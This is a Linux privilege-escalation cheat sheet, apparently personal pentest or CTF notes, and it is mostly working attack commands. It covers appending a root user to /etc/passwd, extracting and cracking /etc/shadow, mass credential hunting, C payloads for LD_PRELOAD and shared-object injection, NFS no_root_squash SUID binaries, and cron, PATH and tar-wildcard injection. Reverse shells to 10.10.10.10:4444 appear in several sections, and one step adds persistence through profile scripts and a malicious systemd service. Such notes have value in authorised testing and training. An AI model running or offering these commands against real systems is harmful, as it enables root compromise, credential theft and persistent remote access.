### Sensitive Files to Check for Weak Permissions

```bash
# Check permissions on important system files
ls -la /etc/passwd /etc/shadow /etc/group /etc/sudoers

# If /etc/passwd is writable, you can add a root user
echo 'eviluser:$1$evil$vCheOdpWJZtECzdZ1fSBq0:0:0:Evil:/root:/bin/bash' >> /etc/passwd
# Login with: eviluser:evil

# If /etc/shadow is readable, extract hashes to crack
cat /etc/shadow | grep -v ":\*:" | grep -v ":!" > hashes.txt
john --format=sha512crypt hashes.txt

# Check for SSH private keys with wrong permissions
find / -name id_rsa 2>/dev/null | xargs ls -la
find / -name "*.pem" 2>/dev/null | xargs ls -la

# Check for private backups with weak permissions
find / -name "*backup*" -o -name "*.bak" -o -name "*.old" 2>/dev/null | xargs ls -la

# Check log files for credentials or sensitive info
find /var/log -type f -readable | xargs grep -l -i "password\|user\|login\|credential"
```

### Application Configuration Files

```bash
# Common location for application configs that might contain credentials
find /etc -type f -name "*.conf" -o -name "*.cfg" -o -name "*.config" 2>/dev/null | xargs grep -l -i "password\|user\|credential"

# Check web server configs
grep -r "password\|user" /etc/apache2/ /etc/nginx/ /etc/httpd/ 2>/dev/null

# Database configuration files
grep -r "password\|user" /etc/mysql/ /etc/postgresql/ 2>/dev/null

# Find readable .htpasswd files
find / -name .htpasswd -readable 2>/dev/null

# Look for plaintext credentials in web application configs
find /var/www -type f -name "wp-config.php" -o -name "configuration.php" -o -name "config.inc.php" 2>/dev/null | xargs grep -l -i "password\|user"
```

## Methodology Checklist

### 1. Initial Reconnaissance

- [ ] Check current user (`id`, `whoami`)
- [ ] Check system info (`uname -a`, `hostname`, `cat /etc/os-release`)
- [ ] List users on the system (`cat /etc/passwd`, `ls -la /home`)
- [ ] Try using username as pass for all the users you identify on the system
- [ ] If any interesting users are present note them to try looking for their creds
- [ ] Check groups you belong to (`id`, `groups`)
- [ ] Run automated scripts (LinPEAS, LSE, LinEnum)
- [ ] Review command output for "red flags" highlighting potential vulns
- [ ] Check for root crons using pspy
- [ ] Check for setuid and capabilties files for potential abuse

### 2. Privilege Escalation Vectors

- [ ] First google all services that you identified running externally for LPE.
- [ ] **Credentials Hunting**
    
    - [ ] Check history files (`~/.bash_history`, etc.)
    - [ ] Read log files in `/var/log/`
    - [ ] Look for config files with credentials
    - [ ] Check for plaintext passwords in memory
    - [ ] Find SSH keys with improper permissions
- [ ] **File Permissions**
    
    - [ ] Check critical files (`/etc/passwd`, `/etc/shadow`, etc.)
    
    # Linux Privilege Escalation Techniques
    



##  Initial Enumeration & Strategy

### Privilege Escalation Strategy

```bash
# First steps - identify who you are
id
whoami
hostname

# Check your sudo privileges
sudo -l
#if you currently dont have a password and want to see if you can run sudo to decide if you want to hunt for the users pass
#If you get info, then you can run sudo otherwise itll show you that your current user cant run sudo
sudo -v

# Check for interesting files in home directories
ls -la ~
cat ~/.bash_history
find /home -type f -name "*.txt" -o -name "*.cfg" -o -name "*.conf" 2>/dev/null

# Look for uncommon filesystems
df -h | grep -v "tmpfs\|proc\|sysfs\|devtmpfs\|cgroup"

# Look for files in obvious places
find /var/backup -type f 2>/dev/null
find /var/logs -type f 2>/dev/null
find /opt -type f -perm -o+r 2>/dev/null

#Look for other users on the system and try out their username as their password
su user
#put user for password
```

### Process Enumeration

```bash
# Check processes running as root
ps aux | grep "^root"

# Monitor processes in real-time (great for catching cron jobs)
watch -n 1 "ps aux | grep root"

# Use pspy to monitor processes without root permissions
./pspy64  # be paitent and look for root/uid 0 related events
```
If you see any root/uid 0 processes running; take note of the files being executed. Are the files writeable to you? Are their any factors the script or process is running you can overwrite or modify? We can use this one liner to check for running processes as root that may have insecure privlidges present

```bash
for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
```
Make sure you read the contents of the scripts running and look at their permissions to determine if anything abusable is present. For example if the script does cd /some/directory/you/can/write
and uses ./ convention thus meaning that you can potentially replace a file or create a file within that directory that the script is executing an element from


### Essential Enumeration Scripts

```bash
# Automated enumeration tools
./LinEnum.sh                # Basic enumeration script
./linpeas_fat.sh -e                # Best linpeas flag and method of running
./linux-exploit-suggester-2.pl # Suggest kernel exploits
./lse.sh -l2               # Linux Smart Enumeration (level 2)
./pspy32                    # Process monitoring (32-bit)
./pspy64                    # Process monitoring (64-bit)
./suid3num.py               # Analyze SUID binaries
```

I reccomend running linpeas_fat.sh -e first and formost. Then run linenum.sh -t or lse.sh -l2
Make notes in order of priority or your preference of attack. For example if linpeas shows a sudo group user, you might want to try to find their creds using some of the other commands in this sheet

### Advanced Process Monitoring

```bash
# Pipe pspy output to filter for interesting events
./pspy64 | grep -E "(uid=0|root|admin|shadow|cron)"

# Monitor file modifications in real-time
inotifywait -m -r /etc /var/www /opt 2>/dev/null

# Check if any processes are connecting to unexpected ports
watch -n 1 "netstat -tulpn | grep LISTEN"
```


## Password Mining & Credentials Hunting

### User Home Directories

```bash
# Check files in home folders for potential password storage
find /home -type f -name "*.txt" -o -name "*.cfg" -o -name "*.conf" 2>/dev/null
find /home -type f -name "*pass*" -o -name "*cred*" 2>/dev/null
find /root -type f -name "*.txt" -o -name "*.cfg" -o -name "*.conf" 2>/dev/null

# Check environment files for credentials
cat ~/.bashrc
cat ~/.profile
cat ~/.bash_history
```

### Mail Content

```bash
cat /var/mail/root
cat /var/spool/mail/root
```

### Configuration Files

```bash
# Legacy password storage (older systems)
cat /etc/passwd

# Check shadow file access
cat /etc/shadow
# If readable, crack passwords:
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt


# Web server configs - often contain database credentials
find /etc/apache2/ -name "*.conf" -type f -exec grep -i -l "pass\|db_passwd\|dbpasswd\|pwd" {} \;
find /etc/httpd/ -name "*.conf" -type f -exec grep -i -l "pass\|db_passwd\|dbpasswd\|pwd" {} \;
find /etc/nginx/ -name "*.conf" -type f -exec grep -i -l "pass\|db_passwd\|dbpasswd\|pwd" {} \;

# Database configuration files
find /var/www/ -name "wp-config.php" -type f 2>/dev/null
find /var/www/ -name "configuration.php" -type f 2>/dev/null # Joomla
find /var/www/ -name "config.inc.php" -type f 2>/dev/null # phpMyAdmin
find /var/ -name "settings.php" -type f 2>/dev/null # Drupal

# SSH configuration
cat /etc/ssh/sshd_config | grep -i "PermitRootLogin\|PasswordAuthentication"

# Look for connection strings in code files
grep -r --include="*.php" -l "connect\|mysqli\|getenv" /var/www/ 2>/dev/null
grep -r --include="*.js" -l "api_key\|apikey\|password\|passwd\|pwd" /var/www/ 2>/dev/null
```

Always ensure you reference external services running and then deciding what check. If you see an external service, even if you didnt use it for initial foothold, 
google online if stores credintials somewhere and looking into those files as well

### Command History

```bash
# Check command history for credentials (in various shells)
history
grep -i -E "passw|pwd|user|username|login|credential" ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.viminfo
cat ~/.zsh_history
cat ~/.python_history
cat ~/.sh_history

# Find all history files 
find / -name "*_history" -type f 2>/dev/null

# One-liner to search all history files for passwords
find / -name "*_history" -type f 2>/dev/null | xargs grep -i "password\|pass\|pwd"
```


### Recursive Search

Two main things to note here when preforming this search. Make sure you change the string. So maybe you add passw, and then try password, pwd, creds, cred etc

The second high fidelity check is using usernames; so if you note some user who is a member of the docker or sudo group then you may want to desprately get their password
and so I would use the commands below and search for them via username
```bash
# Search for files with "passw" in filename
locate passw | more

# Deep search for password strings (use in critical directories only)
grep --color=auto -R -i "passw" --color=always /etc/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /var/www/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /home/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /opt/ 2>/dev/null
grep --color=auto -R -i "passw" --color=always /mnt/ 2>/dev/null

#Catches: $password='value', password='value', password:"value", PASSWORD=value, etc.
find /var/www /opt /etc /home -type f \( -name "*.php" -o -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.xml" -o -name "*.json" -o -name "*.yml" \) 2>/dev/null | xargs grep -E "(password|passwd|pwd|pass)[[:space:]]*[=:][[:space:]]*['\"][^'\"]+['\"]" 2>/dev/null

# Find files containing password strings (less noisy)
find /etc -type f -exec grep -l "password" {} \; 2>/dev/null

# Find world-readable configuration files
find /etc -type f -perm -o=r -name "*.conf" 2>/dev/null

# Search for interesting strings in all files (be cautious, produces a lot of output)
grep -l -i "password\|passw\|pwd\|db_passwd\|dbpasswd" $(find / -readable -type f 2>/dev/null)

# Search for password in files modified in the last 7 days
find / -type f -mtime -7 -readable -exec grep -l -i "password" {} \; 2>/dev/null

# Find logs that might contain sensitive info
find /var/log -type f -name "*.log" -readable -exec grep -l -i "password\|login\|credential" {} \; 2>/dev/null

# Find hidden directories that may have credentials
find / -type d -name ".*" -ls 2>/dev/null | grep -v "^\.\.$"
```

##  SUDO Exploitation

### Understanding Sudo Rights

Sudo allows users to run programs with the security privileges of another user (usually root). The `/etc/sudoers` file controls these permissions and can be configured to:

- Allow specific commands to be run as root
- Allow commands to be run without a password
- Restrict environment variables
- Configure PATH for sudo commands

### General Enumeration

```bash
# Check sudo permissions
sudo -l

# Check recent sudo usage
cat /var/log/auth.log | grep sudo

# Check sudo version for vulnerabilities
sudo -V
```

### Sudo Configuration Analysis

```bash
# Check sudoers file
cat /etc/sudoers    # May require privileges

# Check for any custom sudo configurations
find /etc/sudoers.d/ -type f -exec cat {} \; 2>/dev/null
```

### Exploiting NOPASSWD Entries

When you see output like:

```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

You can execute commands as that user without a password:

```bash
sudo -u scriptmanager <command>
```

```bash
# Quick script to check GTFOBins for a list of sudo-allowed binaries:
#!/bin/bash
allowed=$(sudo -l | grep -Eo "[a-zA-Z0-9/._-]+")
for cmd in $allowed; do
  cmd=$(basename $cmd)
  curl -s https://gtfobins.github.io/gtfobins/$cmd/ | grep -q "sudo" && echo "[+] $cmd can be exploited via sudo!"
done
```

### LD_PRELOAD Exploitation

Requirements:

- `env_keep+=LD_PRELOAD` in sudoers
- At least one binary executable via sudo
- Real UID must equal effective UID (LD_PRELOAD is ignored otherwise)

```bash
# Check if vulnerable
sudo -l | grep "LD_PRELOAD"
# Look for: env_keep+=LD_PRELOAD

# Method 1: Simple root shell
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>

# Method 2: Create SUID binary 
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash");
}
EOF

gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so <allowed_command>
/tmp/rootbash -p
```

##  NFS Root Squashing Exploitation

### Understanding NFS and Root Squashing

- Network File System (NFS) allows remote systems to mount directories over a network
- Root squashing is a security feature that prevents remote root users from having root privileges on mounted shares
- When the `no_root_squash` option is set on an NFS share, a remote root user can create files with root ownership

### Detection

```bash
# Check for mountable shares from Kali
showmount -e <target_IP>

# Nmap script to check for NFS shares
nmap -sV --script=nfs-showmount <target_IP>

# Check exports file on target
cat /etc/exports
# Look for: no_root_squash
grep -E "no_root_squash|no_all_squash" /etc/exports
```

### Exploitation When Target Has no_root_squash

When the exports file shows:

```
/ *(rw,sync,insecure,no_root_squash,no_subtree_check)
```

Use this attack path:

```bash
# On attacker system (must be root)
mkdir /tmp/nfs_mount
mount -t nfs <target_IP>:/shared/directory /tmp/nfs_mount
cd /tmp/nfs_mount

# Method 1: Create SUID binary
cat > root.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
  setuid(0);
  setgid(0);
  system("/bin/bash -p");
  return 0;
}
EOF

gcc root.c -o root
chmod +s root
# As root on local system, set SUID bit on the binary

# On target system
/shared/directory/root
# The -p flag maintains EUID permissions

# Method 2: Simple SUID bash copy
cp /bin/bash /tmp/nfs_mount/bash
chmod +s /tmp/nfs_mount/bash
# On target run
/shared/directory/bash -p

# Method 3: Add entry to /etc/passwd
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' > /tmp/nfs_mount/passwd.new
cat /etc/passwd >> /tmp/nfs_mount/passwd.new
mv /tmp/nfs_mount/passwd.new /tmp/nfs_mount/passwd
# On target, replace /etc/passwd with your version:
cp /shared/directory/passwd /etc/passwd
# Login with credentials: hacker:hacker
```

**CAUTION**: If you get "file or directory not found" but can cat the file, you may be running a 64-bit executable on a 32-bit system (or vice versa).

##  Group Membership Exploitation

### Identifying Group Memberships and Permissions

```bash
# Check your current groups
id
groups

# Find files owned by a specific group
find / -group docker -ls 2>/dev/null
find / -group sudo -ls 2>/dev/null
find / -group admin -ls 2>/dev/null
find / -group adm -ls 2>/dev/null
find / -group shadow -ls 2>/dev/null
find / -group lxd -ls 2>/dev/null

# Find all files belonging to groups you're a member of
for group in $(groups); do echo "Files for group $group:"; find / -group $group 2>/dev/null | grep -v "^/proc\|^/sys\|^/run"; done

# Find all scripts that belong to your groups and are executable
for group in $(groups); do find / -type f -group $group -perm -u=x 2>/dev/null | grep -v "^/proc\|^/sys"; done

# Use stat to inspect file permissions by group
stat /etc/passwd /etc/shadow /etc/group
```

##  Cron Job Exploitation

Cron jobs are scheduled tasks in Linux systems. When these jobs are executed with root privileges, they present potential privilege escalation vectors.

### Enumeration

```bash
# Real-time monitoring of running processes
./pspy64

# Check configured cron jobs
crontab -l
ls -alh /var/spool/cron/
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/crontab
find /etc/cron* -type f -readable 2>/dev/null


# Check user crontabs
for user in $(cat /etc/passwd | cut -f1 -d':'); do echo "### Crontabs for $user ####"; crontab -u $user -l 2>/dev/null; done

# Check systemd timers (newer alternative to cron)
systemctl list-timers --all
find /etc/systemd/system -type f -name "*.timer" -ls 2>/dev/null
find /usr/lib/systemd/system -type f -name "*.timer" -ls 2>/dev/null


# One-liner to find world-writable cron job targets
find $(cat /etc/crontab | grep -v "#" | grep -v "^$" | awk '{print $NF}' 2>/dev/null) -writable 2>/dev/null
```

### File Overwrite Attack

Requirements:

- Cron job runs as root
- Write access to the executed script/binary

```bash
# Overwrite the target script
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /path/to/overwritable/script

# Make sure it's executable
chmod +x /path/to/overwritable/script

# Wait for cron job to execute, then run
/tmp/rootbash -p
```

### PATH Variable Attack

Requirements for Attack One:

- Cron job runs as root
- Cron job uses relative paths
- Write access to a directory in the PATH

Example of a vulnerable crontab:

```
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

Exploitation:

```bash
# Create malicious executable in writable PATH directory
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/overwrite

# Make it executable 
chmod +x /home/user/overwrite

# Wait for cron job to execute, then run
/tmp/rootbash -p
```
Requirments for Attack Two:
- Script or Cronjob running as an elevated user(root or equalvent rights)
- Cron job or script invokes commands(could be any including echo, test, or other misc shell calls) with relative path
- Working Directory the script/cron is operating in is writeable to you

Example of a vulnrable cron/script to the above:
```
PATH=./home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```
The "." signifies that any command invokved, bash will first look for it in the current working directory first before referncing the rest of your path. 

Exploitation:
```bash
# Create malicious executable in the writebale working directory with the name of a relative call binary
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/echo

# Make it executable 
chmod +x /home/user/echo

# Wait for cron job to execute, which will execute echo found in the working directory instead of the real one and run
/tmp/rootbash -p
```

### Wildcard Injection Attack

Requirements:

- Cron job runs as root
- Script uses wildcards (e.g., `tar czf /backup.tar.gz *`)

Example vulnerable script:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

#### Exploitation Methods

**Method 1: Using tar checkpoint feature**

```bash
# Create payload script
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash' > /home/user/runme.sh
chmod +x /home/user/runme.sh

# Create checkpoint files
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh

# Wait for tar command to run with wildcard, then
/tmp/rootbash -p
```

**Method 2: Using different tar flag injection**

```bash
# Simple reverse shell
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > shell.sh
chmod +x shell.sh
touch "/home/user/--checkpoint-action=exec=sh shell.sh"
touch /home/user/--checkpoint=1
```

**Method 3: Find wildcard usage in scripts**

```bash
# Find all scripts using wildcards
grep -r "\*" /etc/cron* /var/spool/cron/ /etc/anacrontab 2>/dev/null | grep -v ":#"

# Check if you have write access to the directory where wildcard is used
find $(grep -r "\*" /etc/cron* 2>/dev/null | grep -v ":#" | awk -F: '{print $1}' | xargs dirname 2>/dev/null | sort -u) -writable 2>/dev/null
```

**Other Common Command Flags for Wildcard Injection**

```bash
# For tar
touch /home/user/--use-compress-program='nc 10.10.10.10 4444 -e /bin/bash'

# For rsync 
touch /home/user/-e sh\ shell.sh

# For chown
touch /home/user/--reference=shell.sh
```

##  SUID/SGID Binary Exploitation

### Understanding SUID/SGID

SUID (Set User ID) and SGID (Set Group ID) are permission bits that allow users to execute a file with the permissions of the file owner or group respectively. When these special permissions are set on files owned by root, they can be leveraged for privilege escalation.

### Finding SUID/SGID Binaries

```bash
# Find all SUID binaries (user execution rights)
find / -type f -perm -u=s 2>/dev/null

# Find all SGID binaries (group execution rights)
find / -type f -perm -g=s 2>/dev/null

# Find both SUID and SGID binaries
find / -type f -a \( -perm -u+s -o -perm -g+s \) 2>/dev/null

# Use suid3num.py for automatic detection and exploitation suggestions
python3 suid3num.py

# Find all SUID/SGID binaries and sort by date (recently installed might be interesting)
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null | sort -k6,8

# Filter out "standard" SUID binaries that are commonly installed
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null | grep -v -E "ping|mount|umount|sudo|su|passwd|unix_chkpwd|newgrp|gpasswd|chsh|at|ssh-keysign|pkexec|chfn|hosts_access|dbus-daemon-launch-helper|exim"
````

## Linux File capabilities exploitation

Liux capabilties are a granular way of providing elevated permissions to a file to allow it to do a specific action. For example a capability can allow a file to preform file reads as if they are root but only allowing that narrow, defined task to be executed in a privlidged context
```bash
# Find all binaries with capabilities
getcap -r / 2>/dev/null

# Check capabilities of a specific binary
getcap /usr/bin/vstpd

# List all available capabilities
capsh --print

# All abuseable capabilities:
# CAP_SETUID - allows changing of UID
# CAP_DAC_OVERRIDE - bypass file read/write/execute permission checks
# CAP_DAC_READ_SEARCH - bypass file/directory read permission checks
# CAP_SYS_ADMIN - basically root
# CAP_NET_RAW - packet sniffing
# CAP_CHOWN - Change file ownership
# +ep means the file can do anything as root(basically setuid)

# Example exploitation:
# If python has cap_setuid+ep
/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# If tar has CAP_DAC_READ_SEARCH
/usr/bin/tar -cf /tmp/shadow.tar /etc/shadow
tar -xf /tmp/shadow.tar -O

# If zip has CAP_DAC_READ_SEARCH
/usr/bin/zip /tmp/shadow.zip /etc/shadow
unzip -p /tmp/shadow.zip

# If openssl has CAP_DAC_READ_SEARCH
/usr/bin/openssl enc -in /etc/shadow

# If cp has CAP_DAC_OVERRIDE
echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd
/usr/bin/cp /tmp/passwd /etc/passwd

```
There are infinite potential avenues and thus its important if you encounter an unfimilar binary to look at the documentation or run -h or google the name of the binary with priv esc

### Shell Escape Sequences

Check GTFOBins for exploitation techniques: [GTFOBins](https://gtfobins.github.io/)

```bash
# Quick script to identify exploitable SUID binaries using GTFOBins
for suid in $(find / -type f -perm -4000 2>/dev/null); do
  basename=$(basename $suid)
  curl -s https://gtfobins.github.io/gtfobins/$basename/ | grep -q "suid" && echo "[+] $suid can be exploited via SUID!"
done
```

### Shared Object Injection

Requirements:

- SUID binary calls missing shared object (.so) file
- Write access to the directory containing the missing .so

```bash
# Find missing shared objects with strace
strace /path/to/suid/binary 2>&1 | grep -i -E "open|access|no such file"

# Alternative: use ltrace to also see library calls
ltrace /path/to/suid/binary 2>&1 | grep -i -E "open|access|dlopen"

# Create malicious shared object
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p");
}
EOF

# Compile shared object
gcc -shared -fPIC -o /path/to/missing.so /tmp/evil.c

# Run the SUID binary
/path/to/suid/binary

# Execute with elevated privileges
/tmp/rootbash -p
```
### Shared Object Hijacking
Requirements:
 - A eleavtred program is running/calling a SO file you have write permissions over OR
 - You have write permissions over a directory in which a privlidged/elebvated program is calling a .so file OR
 - You own a directory in which a SO file is called from by a privlidged process(this appears differently then having explicit write permissions)
```bash
#To get a running list of all processes running and each of the shared objects they have loaded
lsof -n | grep 'DEL\|REG' | grep '\.so$'

#not ALL *nix systems are garunteed to have lsof so instead we can use the following to look for every process and its loaded shared objects
for i in /proc/[0-9]*/maps; do echo -e "\n--- $(basename $(dirname $i)) ---\n$(grep '\.so' $i 2>/dev/null | grep -v 'vdso\|vsyscall')"; done

#Detect SO files and/or associated directories loaded by the target that are writable to current user
ldd /usr/bin/some_binary | awk '{print $3}' | grep '^/' | while read -r so; do [ -w "$so" ] && echo "File Write: $so"; [ -w "$(dirname "$so")" ] && echo "Dir Write: $(dirname "$so")/$"; done
```
### RPATH / RUNPATH in Shared Objects

RPATH / RUNPATH are hard-coded library search paths embedded in ELF executables. They tell the dynamic linker where to look for shared libraries used by that binary.

readelf -d <binary> shows these as RPATH or RUNPATH entries. (NEEDED lines show which libraries are required.)

Some key differences include(there are others I believe but havent come around to verifying):

- DT_RPATH (RPATH) is older. It is searched before LD_LIBRARY_PATH.

- DT_RUNPATH (RUNPATH) is newer. It is searched after LD_LIBRARY_PATH.

Because RPATH/RUNPATH is embedded in the binary, if you can write into a directory listed there (or otherwise influence files under that path)  you can cause the program to load your supplied libraries/SO files. Note that these are a bit different than what you see when you used the above check to with ldd:

```bash
#Show RPATH / RUNPATH and needed libs for a given binary
readelf -d ./some_binary | egrep "NEEDED|RPATH|RUNPATH"

#Hunt for RPATH/RUMPATH in a target binary and check for any writeable files/directories within the directive
bin=/usr/bin/some_binary; readelf -d "$bin" 2>/dev/null | awk -F'[][]' '/RPATH|RUNPATH/{print $2}' | tr ':' '\n' | while IFS= read -r dir; do [ -w "$dir" ] && echo "Writable RPATH Dir: $dir"; for f in "$dir"/*.so*; do [ -f "$f" ] && [ -w "$f" ] && echo "Writable SO: $f"; done; done
```
Bassically its RPATH present → path(s) = … → path writable? yes/no → binary SUID? yes/no → chance of abuse level.

As a general comment for all the above listed Shared Object Abuse primitives; your biggest wins will come from targetting exotic/custom files implemented by in house developers or on weird systems such as printers(yes printers) and other IoT devices with less consumer facing/widely deployed tooling. 
### One-liners to Hunt for Vulnerable SUID Binaries

```bash
# Find SUID programs calling system() function
for suid in $(find / -type f -perm -4000 2>/dev/null); do strings $suid | grep -i "system(" && echo "System call found in $suid"; done

# Find SUID programs importing insecure library functions
for suid in $(find / -type f -perm -4000 2>/dev/null); do objdump -T $suid 2>/dev/null | grep -E "system|exec|fork|bash" && echo "Vulnerable import in $suid"; done

# Check for SUID programs with relative path bin calls
for suid in $(find / -type f -perm -4000 2>/dev/null); do strings $suid | grep -E "^[a-zA-Z0-9_-]{1,30}$" | sort -u | xargs which 2>/dev/null | grep -v "^/"; done

# Find custom (non-standard) SUID binaries that might be vulnerable
find / -type f -perm -4000

#Check the strings in SUID binary, espcially if it looks custom and see if its calling other programs or executing files without full path
```
### Environment Variable Exploitation

#### For Relative Binary References
Requirements:
- SUID binary makes relative calls to other programs
- Control over PATH environment variable

```bash
# Check for binary calls using strings
strings /usr/local/bin/suid-binary

# Determine if binary uses system() or execve() with relative paths
strace -v -f -e execve /usr/local/bin/suid-binary 2>&1 | grep exec

# Alternative: use ltrace to track library calls
ltrace /usr/local/bin/suid-binary 2>&1 | grep -E "system|exec|popen"

# Modify PATH to include our malicious directory
export PATH=/tmp:$PATH

# Create malicious binary matching the relative call name
cat > /tmp/program_name << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /tmp/program_name

# Execute the SUID binary
/usr/local/bin/suid-binary

# Run with elevated privileges
/tmp/rootbash -p
````

#### For Absolute Binary References

Requirements:

- SUID binary makes absolute calls to other programs

```bash
# Create function with the absolute path name
function /usr/sbin/service() { 
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash
}

# Export the function
export -f /usr/sbin/service

# Execute the SUID binary
/usr/local/bin/suid-binary

# Run with elevated privileges
/tmp/rootbash -p
```

### Abusing Shell Features (Bash < 4.2-048)

```bash
# Verify bash version is vulnerable
bash --version

# Create a bash function with absolute path
function /usr/sbin/service { /bin/bash -p; }

# Export the function
export -f /usr/sbin/service

# Execute the SUID binary
/usr/local/bin/suid-binary
```

### Abusing Bash Debugging Mode (Bash < 4.4)

```bash
# For binaries that use system() or similar and run via bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-binary

# Execute the rootbash
/tmp/rootbash -p
```

### Finding Vulnerable SUID Binaries (Advanced)

```bash
# Find SUID files with dynamic library dependencies
for suid in $(find / -perm -4000 -type f 2>/dev/null); do
  ldd "$suid" 2>/dev/null | grep -q "=> not found" && echo "[$suid] Missing library!"
done

# Find SUID programs with file operations on directories we can write to
strace -f -e trace=file /path/to/suid/binary 2>&1 | grep -E "open|access|stat" | grep -E "/tmp|/var/tmp|/dev/shm|/home"

# Find all SUID binaries with file operations/exec functions
for suid in $(find / -perm -4000 -type f 2>/dev/null); do
  echo "======== $suid ========"
  strings "$suid" | grep -E "fopen|open|system|exec|popen" 
done
```

##  Startup Script & Service Exploitation

### Identifying Vulnerable Startup Scripts

```bash
# Check for startup scripts writable by the current user in various locations
find /etc/init.d -writable 2>/dev/null
find /etc/rc.d -writable 2>/dev/null
find /etc/rc.d/init.d -writable 2>/dev/null
find /etc/init -writable 2>/dev/null
find /etc/systemd/system -writable 2>/dev/null
find /usr/lib/systemd/system -writable 2>/dev/null

# Check for writable system-wide profile scripts
find /etc/profile.d -writable 2>/dev/null
find /etc/profile -writable 2>/dev/null
find /etc/bash.bashrc -writable 2>/dev/null
 
# Find scripts with SUID/SGID permissions that might be called during startup
find / -perm -u+s -type f -exec ls -la {} \; 2>/dev/null | grep -E "\/etc\/(init|rc)"

# Find service configurations that run as root
grep -r "User=root\|UID=0" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null
```

### Script Modification Attack

```bash
# Backup original script (good practice)
cp /etc/init.d/vulnerable_script /tmp/backup

# Method 1: Replace or edit startup script directly
cat > /etc/init.d/vulnerable_script << EOF
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
# Original script follows
$(cat /tmp/backup)
EOF

# Make sure it's executable
chmod +x /etc/init.d/vulnerable_script

# Method 2: Add reverse shell to system-wide profile
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> /etc/profile.d/shell.sh
chmod +x /etc/profile.d/shell.sh

# Method 3: Create a malicious systemd service
cat > /etc/systemd/system/privesc.service << EOF
[Unit]
Description=Privilege Escalation Service

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'
Restart=no

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the malicious service if you have sudo rights
sudo systemctl enable privesc.service
sudo systemctl start privesc.service

#Post running rootbash to upgrade our shell fully
python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")' #You can also use python3 with the same command if its present instead
```
### Identifing Vulnrable Services
```bash
#Identify all weak permission services running as root
for i in $(ps auxww | grep root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done

#Identify all weak permissioned services running as another user, other than root
for i in $(ps auxww | grep -v root | awk '{ print $11 }' | grep -v '^\[' | grep -v COMMAND | grep -v '(' | grep -v ':$' | grep -v 'supervising' | sort | uniq); do ls -la $(which "$(echo $i | sed -e 's#^\./##')");done
```

### One-liners to Identify Service Vulnerabilities

```bash
# Find world-writable service configuration files
find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null

# Find services that execute writable scripts
grep -r "ExecStart=" /etc/systemd/system /lib/systemd/system 2>/dev/null | grep -v "^#" | awk '{print $2}' | xargs -I{} find {} -writable 2>/dev/null

# Check for processes running as root with open file descriptors to writable files
